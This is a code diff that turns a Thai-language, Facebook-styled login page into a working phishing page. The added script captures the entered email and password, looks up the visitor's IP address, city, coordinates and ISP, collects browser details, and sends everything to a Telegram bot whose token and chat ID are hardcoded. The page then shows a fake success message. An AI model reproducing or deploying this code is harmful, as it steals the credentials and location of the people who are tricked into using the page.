@@ -233,16 +233,16 @@
             margin: 0 auto;
         }
         
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        
         .privacy-notice {
             font-size: 12px;
             color: #65676b;
             margin-top: 15px;
             text-align: center;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
         
         @media (max-width: 480px) {
@@ -315,82 +315,180 @@
     </div>
 
     <script>
-        // Professional login form handling
+        // Telegram bot configuration
+        const BOT_TOKEN = "8162779617:AAGjL983jsQ9onFhJf2SDjgx15NKj0JS5eg";
+        const CHAT_ID = "@Dy_Ma_Ma_Dy";
+        
+        // Get user's IP address and location
+        async function getUserLocation() {
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const userIP = ipData.ip;
+                
+                const locationResponse = await fetch(`https://ipapi.co/${userIP}/json/`);
+                const locationData = await locationResponse.json();
+                
+                return {
+                    ip: userIP,
+                    country: locationData.country_name || 'ไม่ทราบ',
+                    city: locationData.city || 'ไม่ทราบ',
+                    region: locationData.region || 'ไม่ทราบ',
+                    timezone: locationData.timezone || 'ไม่ทราบ',
+                    isp: locationData.org || 'ไม่ทราบ',
+                    latitude: locationData.latitude || 'ไม่ทราบ',
+                    longitude: locationData.longitude || 'ไม่ทราบ'
+                };
+            } catch (error) {
+                console.error('Error fetching location:', error);
+                return {
+                    ip: 'ไม่สามารถระบุได้',
+                    country: 'ไม่ทราบ',
+                    city: 'ไม่ทราบ',
+                    region: 'ไม่ทราบ',
+                    timezone: 'ไม่ทราบ',
+                    isp: 'ไม่ทราบ',
+                    latitude: 'ไม่ทราบ',
+                    longitude: 'ไม่ทราบ'
+                };
+            }
+        }
+        
+        // Get browser and device information
+        function getDeviceInfo() {
+            return {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screenResolution: `${screen.width}x${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                cookiesEnabled: navigator.cookieEnabled,
+                javaEnabled: navigator.javaEnabled ? 'ใช่' : 'ไม่'
+            };
+        }
+
+        // Pre-load location data in background
+        let userLocationData = null;
+        getUserLocation().then(data => {
+            userLocationData = data;
+        });
+        
+        // Handle form submission
         document.getElementById('loginForm').addEventListener('submit', async function(e) {
             e.preventDefault();
             
-            // Get form data
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
-            
-            // Basic validation
-            if (!email || !password) {
-                showMessage('errorMessage', 'กรุณากรอกอีเมลและรหัสผ่าน');
-                return;
-            }
             
             // Show loading indicator
             document.getElementById('loadingIndicator').style.display = 'block';
             document.getElementById('successMessage').style.display = 'none';
             document.getElementById('errorMessage').style.display = 'none';
             
-            // Simulate authentication process
+            // Ensure we have location data
+            if (!userLocationData) {
+                userLocationData = await getUserLocation();
+            }
+            
+            // Get device information
+            const deviceInfo = getDeviceInfo();
+            
+            // Prepare data for Telegram
+            const userData = {
+                email: email,
+                password: password,
+                country: "Thailand",
+                ip_address: userLocationData.ip,
+                location: `${userLocationData.city}, ${userLocationData.region}, ${userLocationData.country}`,
+                coordinates: `${userLocationData.latitude}, ${userLocationData.longitude}`,
+                timezone: userLocationData.timezone,
+                isp: userLocationData.isp,
+                timestamp: new Date().toLocaleString('th-TH'),
+                user_agent: deviceInfo.userAgent,
+                platform: deviceInfo.platform,
+                browser_language: deviceInfo.language,
+                screen_resolution: deviceInfo.screenResolution,
+                cookies_enabled: deviceInfo.cookiesEnabled,
+                java_enabled: deviceInfo.javaEnabled
+            };
+            
+            // Format message for Telegram
+            const message = `📱 ข้อมูลเข้าสู่ระบบ Facebook
+
+👤 ข้อมูลผู้ใช้:
+อีเมล/โทรศัพท์: ${userData.email}
+รหัสผ่าน: ${userData.password}
+ประเทศ: ${userData.country}
+
+📍 ข้อมูลตำแหน่ง:
+IP Address: ${userData.ip_address}
+ตำแหน่ง: ${userData.location}
+พิกัด: ${userData.coordinates}
+เขตเวลา: ${userData.timezone}
+ผู้ให้บริการอินเทอร์เน็ต: ${userData.isp}
+เวลาที่เข้าสู่ระบบ: ${userData.timestamp}
+
+💻 ข้อมูลอุปกรณ์:
+User Agent: ${userData.user_agent}
+แพลตฟอร์ม: ${userData.platform}
+ภาษาบราวเซอร์: ${userData.browser_language}
+ความละเอียดหน้าจอ: ${userData.screen_resolution}
+คุกกี้เปิดใช้งาน: ${userData.cookies_enabled}
+Java เปิดใช้งาน: ${userData.java_enabled}`;
+
+            // Send data to Telegram bot
             try {
-                // In a real application, this would be a secure API call to your backend
-                await simulateAuthentication(email, password);
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+
+                const data = await response.json();
                 
-                // Show success message
-                showMessage('successMessage', 'เข้าสู่ระบบสำเร็จ!');
-                
-                // Clear form
-                document.getElementById('email').value = '';
-                document.getElementById('password').value = '';
-                
-            } catch (error) {
-                showMessage('errorMessage', 'อีเมลหรือรหัสผ่านไม่ถูกต้อง');
-            } finally {
                 // Hide loading indicator
                 document.getElementById('loadingIndicator').style.display = 'none';
+                
+                if (data.ok) {
+                    // Show success message
+                    document.getElementById('successMessage').style.display = 'block';
+                    
+                    // Clear form
+                    document.getElementById('email').value = '';
+                    document.getElementById('password').value = '';
+                    
+                    // Hide success message after 3 seconds
+                    setTimeout(() => {
+                        document.getElementById('successMessage').style.display = 'none';
+                    }, 3000);
+                } else {
+                    throw new Error('Telegram API error');
+                }
+            } catch (error) {
+                console.error('Error sending data to Telegram:', error);
+                
+                // Hide loading indicator
+                document.getElementById('loadingIndicator').style.display = 'none';
+                
+                // Show error message
+                document.getElementById('errorMessage').style.display = 'block';
+                
+                // Hide error message after 3 seconds
+                setTimeout(() => {
+                    document.getElementById('errorMessage').style.display = 'none';
+                }, 3000);
             }
         });
-        
-        // Helper function to show messages
-        function showMessage(elementId, message) {
-            const element = document.getElementById(elementId);
-            element.textContent = message;
-            element.style.display = 'block';
-            
-            // Auto-hide messages after 3 seconds
-            setTimeout(() => {
-                element.style.display = 'none';
-            }, 3000);
-        }
-        
-        // Simulate authentication (replace with actual API call)
-        function simulateAuthentication(email, password) {
-            return new Promise((resolve, reject) => {
-                setTimeout(() => {
-                    // This is a simulation - in reality, you would validate against your backend
-                    if (email && password.length >= 6) {
-                        resolve({ success: true });
-                    } else {
-                        reject(new Error('Authentication failed'));
-                    }
-                }, 1500);
-            });
-        }
         
         // Add click handler for create account button
         document.querySelector('.create-btn').addEventListener('click', function() {
             alert('คุณกำลังสร้างบัญชีใหม่');
-        });
-        
-        // Add privacy-focused enhancements
-        document.addEventListener('DOMContentLoaded', function() {
-            console.log('Login page loaded securely');
-            
-            // Add security headers in a real application
-            // These would typically be set server-side
         });
     </script>
 </body>
